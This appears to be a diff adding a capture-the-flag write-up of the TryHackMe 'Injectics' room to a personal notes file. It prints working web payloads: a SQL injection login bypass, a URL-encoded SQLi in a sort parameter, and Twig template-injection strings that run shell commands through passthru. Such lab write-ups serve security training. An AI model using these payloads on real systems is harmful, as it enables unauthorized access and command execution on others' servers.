@@ -3842,3 +3842,50 @@ https://<target>/query_users?sort=name-%3E%22%27))%20LIMIT%2010%23
 
 ✅ Status
 ✔️ Room completed 📁 Part of the Injection module in the Offensive Cybersecurity certification 🔍 Focus: Red Team / Web Pentesting
+
+# TryHackMe Room: Injectics
+
+## 🧠 Overview
+
+Injectics is a realistic web pentesting room focused on exploiting SQL Injection (SQLi) and Server-Side Template Injection (SSTI) to retrieve protected flags. It serves as the final challenge in the injection module of TryHackMe's offensive track.
+
+---
+
+## 🎯 Objectives Achieved
+
+- Bypassed login using boolean-based SQLi:
+  ```plaintext
+  username=' || 1 = 1 -- &password=...
+
+Identified frontend and backend filters blocking keywords and symbols
+
+Discovered hidden files and folders using Gobuster:
+
+/composer.json
+
+/flags/
+
+Confirmed SSTI vulnerability in Twig via profile name reflection:
+
+twig
+{{7*7}} → returned 49
+Executed commands via Twig SSTI:
+
+twig
+{{ ['ls', ''] | sort('passthru') }}
+{{ ['cat /flags/xxx.txt', ''] | sort('passthru') }}
+Retrieved both flags and completed the room
+
+🛠️ Techniques Used
+Manual payload crafting
+
+Filter evasion using logical operators (||)
+
+Gobuster for directory enumeration
+
+SSTI exploitation in Twig
+
+Minimal use of Burp Suite (AttackBox performance workaround)
+
+✅ Status
+✔️ Room completed 📁 Part of the injection module in the Offensive Cybersecurity certification 🔍 Focus: Red Team / Web Pentesting
